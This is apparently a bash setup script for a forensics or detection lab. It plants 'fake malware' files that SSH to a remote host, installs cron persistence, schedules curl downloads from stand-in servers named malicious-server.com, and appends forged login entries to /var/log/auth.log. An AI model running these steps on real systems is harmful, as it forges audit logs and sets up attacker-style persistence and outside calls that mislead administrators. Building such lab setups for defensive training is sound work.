#!/bin/bash

# Step 1: Install necessary tools
sudo apt-get update
sudo apt-get install -y net-tools

# Step 2: Create directories and fake malware files
mkdir -p /opt/vulnerable
echo "#!/bin/bash" > /opt/vulnerable/malware.sh
echo "echo 'Malware running...'" >> /opt/vulnerable/malware.sh
echo "ssh -o StrictHostKeyChecking=no h4x0r_group@10.0.1.10 'echo h4x0r_group >> /tmp/command.log'" >> /opt/vulnerable/malware.sh
chmod +x /opt/vulnerable/malware.sh

echo "import os" > /opt/vulnerable/exploit.py
echo "print('Exploit running...')" >> /opt/vulnerable/exploit.py
echo "os.system('ssh -o StrictHostKeyChecking=no h4x0r_group@10.0.1.10 \"echo h4x0r_group >> /tmp/command.log\"')" >> /opt/vulnerable/exploit.py

# Step 3: Set up cron jobs for fake malware activity
(crontab -l ; echo "*/5 * * * * /opt/vulnerable/malware.sh") | crontab -
(crontab -l ; echo "*/10 * * * * python3 /opt/vulnerable/exploit.py") | crontab -

# Step 4: Simulate network traffic
(crontab -l ; echo "*/15 * * * * curl -s http://malicious-server.com/commands.sh -o /tmp/commands.sh") | crontab -

# Step 5: Generate fake SSH logs
echo "Accepted publickey for user from 192.168.0.1 port 22 ssh2: RSA SHA256:example" >> /var/log/auth.log
echo "Accepted password for user from 192.168.0.2 port 22 ssh2" >> /var/log/auth.log
echo "Accepted publickey for user from 192.168.0.1 port 22 ssh2: RSA SHA256:example" >> /var/log/auth.log
echo "Accepted password for user from 192.168.0.2 port 22 ssh2" >> /var/log/auth.log

# Step 6: Create log rotation to mimic continuous activity
logrotate_conf="/etc/logrotate.d/vulnerable"
echo "/var/log/auth.log {
    daily
    rotate 7
    compress
    delaycompress
    missingok
    notifempty
    create 640 root adm
}" > $logrotate_conf

# Step 7: Simulate HTTP/HTTPS connections
(crontab -l ; echo "*/20 * * * * curl -s https://another-malicious-server.com/update.sh -o /tmp/update.sh") | crontab -

echo "Setup complete. Fake malware and logs have been created."
